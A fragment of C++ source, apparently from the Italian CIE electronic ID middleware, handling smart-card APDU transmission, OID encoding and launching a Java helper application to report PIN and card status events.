            LOG_INFO("TokenTransmitCallback - Resetting Card");

            return ris;
        }
    }
    //ODS(String().printf("APDU: %s\n", dumpHexData(ByteArray(apdu, apduSize), String()).lock()).lock());
    mitm_out(apdu, apduSize);
    auto ris = SCardTransmit(conn->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
    mitm_in(resp, respSize);

    LOG_DEBUG("TokenTransmitCallback - Smart card response:");
    LOG_BUFFER(resp, *respSize);

    if(ris == SCARD_W_RESET_CARD || ris == SCARD_W_UNPOWERED_CARD)
    {
        LOG_INFO("TokenTransmitCallback - Card Reset done");

        DWORD protocol = 0;
        ris = SCardReconnect(conn->hCard, SCARD_SHARE_SHARED, SCARD_PROTOCOL_Tx, SCARD_LEAVE_CARD, &protocol);
        if (ris != SCARD_S_SUCCESS)
            LOG_ERROR("TokenTransmitCallback - ScardReconnect error: %d");
        else{
            ris = SCardTransmit(conn->hCard, SCARD_PCI_T1, apdu, apduSize, NULL, resp, respSize);
            LOG_DEBUG("TokenTransmitCallback - Smart card response:");
            LOG_BUFFER(resp, *respSize);   
        }
    }
    
    if (ris != SCARD_S_SUCCESS) {
        LOG_ERROR("TokenTransmitCallback - SCardTransmit error: %d", ris);
    }
    
    //else
    //ODS(String().printf("RESP: %s\n", dumpHexData(ByteArray(resp, *respSize), String()).lock()).lock());
    
    return ris;
}



std::vector<word32> fromObjectIdentifier(std::string sObjId)
{
    std::vector<word32> out;
    
    int nVal;
    int nAux;
    char* szTok;
    char* szOID = new char[sObjId.size() + 1];
    strncpy(szOID, sObjId.c_str(), sObjId.size());
    char *next = NULL;
    szTok = strtok_r(szOID, ".", &next);

    UINT nFirst = 40 * strtol(szTok, NULL, 10) + strtol(strtok_r(NULL, ".", &next), NULL, 10);
    if(nFirst > 0xff)
    {
        delete[] szOID;
        throw -1;//new CASN1BadObjectIdException(strObjId);
    }
    
    out.push_back(nFirst);
    
    int i = 0;
    
    while ((szTok = strtok_r(NULL, ".", &next)) != NULL)
    {
        nVal = strtol(szTok, NULL, 10);
        if(nVal == 0)
        {
            out.push_back(0x00);
        }
        else if (nVal == 1)
        {
            out.push_back(0x01);
        }
        else
        {
            i = (int)ceil((log((double)abs(nVal)) / log((double)2)) / 7); // base 128
            while (nVal != 0)
            {
                nAux = (int)(floor(nVal / pow(128, i - 1)));
                nVal = nVal - (int)(pow(128, i - 1) * nAux);
                
                // next value (or with 0x80)
                if(nVal != 0)
                    nAux |= 0x80;

                out.push_back(nAux);
                
                i--;
            }
        }
    }
    
    
    delete[] szOID;

    return out;
}
bool file_exists (const char* name);

char command[1000];

void* mythread(void* thr_data) {

	char* command = (char*)thr_data;
	system(command);

	return NULL;
}

int sendMessage(const char* szCommand, const char* szParam)
{
	char* file = "/usr/share/CIEID/jre/bin/java";

	if(!file_exists(file))
		file = "java";

	const char* arg = "-Xms1G -Xmx1G -Djna.library.path=\".:/usr/local/lib\" -classpath \"/usr/share/CIEID/cieid.jar\" it.ipzs.cieid.MainApplication";

	snprintf(command, 1000, "%s %s %s", file, arg, szCommand);

	pthread_t thr;
	pthread_create(&thr, NULL, mythread, (void*)command);

	return 0;
}

//int sendMessageOld(const char* szCommand, const char* szParam)
//{
//    int sock;
//    struct sockaddr_in server;
//    char szMessage[100] , szServerReply[1000];
//
//    //Create socket
//    sock = socket(AF_INET , SOCK_STREAM , 0);
//    if (sock == -1)
//    {
//        printf("Could not create socket");
//    }
//    puts("Socket created");
//
//    server.sin_addr.s_addr = inet_addr("127.0.0.1");
//    server.sin_family = AF_INET;
//    server.sin_port = htons( 8888 );
//
//    //Connect to remote server
//    if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0)
//    {
//        perror("connect failed. Error");
//        return 1;
//    }
//
//    puts("Connected\n");
//
//    if(szParam)
//        sprintf(szMessage, "%s:%s", szCommand, szParam);
//    else
//        sprintf(szMessage, "%s", szCommand);
//
//    std::string sMessage = szMessage;
//    std::string sCipherText;
//
//    encrypt(sMessage, sCipherText);
//
//    int messagelen = (int)sCipherText.size();
//    std::string sHeader((char*)&messagelen, sizeof(messagelen));
//
//    sMessage = sHeader.append(sCipherText);
//
//    //Send some data
//    if( send(sock , sMessage.c_str(), (size_t)sMessage.length() , 0) < 0)
//    {
//        puts("Send failed");
//        return 2;
//    }
//
//    //Receive a reply from the server
//    if( recv(sock , szServerReply , 100 , 0) < 0)
//    {
//        puts("recv failed");
//        return 3;
//    }
//
//    puts("Server reply :");
//    puts(szServerReply);
//
//    close(sock);
//
//    return 0;
//}

void notifyPINLocked()
{
    sendMessage("pinlocked", NULL);
}

void notifyPINWrong(int trials)
{
    char szParam[3];
    snprintf(szParam, 3, "%d", trials);

    sendMessage("pinwrong", szParam);
}

void notifyCardNotRegistered(const char* szPAN)
{
    sendMessage("cardnotregistered", szPAN);
}
